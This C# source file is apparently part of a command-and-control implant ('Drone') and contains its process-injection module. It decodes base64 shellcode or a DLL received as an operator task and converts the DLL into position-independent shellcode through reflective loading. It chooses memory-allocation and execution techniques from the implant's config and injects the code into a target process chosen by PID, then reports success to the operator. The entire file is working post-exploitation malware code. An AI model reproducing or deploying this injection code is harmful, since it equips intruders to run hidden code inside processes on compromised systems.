using System;
using System.Diagnostics;
using System.Linq;
using System.Threading;

using Drone.Models;

using StandardApi.Invocation.Injection;

namespace StandardApi
{
    public partial class StandardApi
    {
        private void ShellcodeInject(DroneTask task, CancellationToken token)
        {
            var pid = int.Parse(task.Arguments[0]);
            var shellcode = Convert.FromBase64String(task.Artefact);
            var success = InjectShellcode(pid, shellcode, out var processName);

            if (success) Drone.SendResult(task.TaskGuid, $"Successfully injected {shellcode.Length} bytes into {processName}");
            else Drone.SendError(task.TaskGuid, $"Failed to inject into {processName}");
        }

        private void InjectReflectiveDll(DroneTask task, CancellationToken token)
        {
            var pid = int.Parse(task.Arguments[0]);
            var dllBytes = Convert.FromBase64String(task.Artefact);
            var sRDI = new ShellcodeReflectiveDllInjection(dllBytes);
            var shellcode = sRDI.ConvertToShellcode();
            var success = InjectShellcode(pid, shellcode, out var processName);

            if (success) Drone.SendResult(task.TaskGuid, $"Successfully injected {shellcode.Length} bytes into {processName}");
            else Drone.SendError(task.TaskGuid, $"Failed to inject into {processName}");
        }

        private bool InjectShellcode(int pid, byte[] shellcode, out string processName)
        {
            // create the payload
            var payload = new PICPayload(shellcode);

            // get the allocation and execution techniques from the drone config
            var allocType = Config.GetConfig<string>("AllocationTechnique");
            var execType = Config.GetConfig<string>("ExecutionTechnique");
            
            // get a reference to types in our own assembly
            var self = System.Reflection.Assembly.GetExecutingAssembly();
            var types = self.GetTypes();

            // find the correct techniques and create instances of them
            // the names should match
            var allocationTechnique = (from type in types where type.Name.Contains(allocType)
                select (AllocationTechnique)Activator.CreateInstance(type)).FirstOrDefault();
            
            var executionTechnique = (from type in types where type.Name.Contains(execType)
                select (ExecutionTechnique)Activator.CreateInstance(type)).FirstOrDefault();
            
            // get handle to the process
            using var process = Process.GetProcessById(pid);
            processName = process.ProcessName;
            
            // inject
            return Injector.Inject(payload, allocationTechnique, executionTechnique, process);
        }
    }
}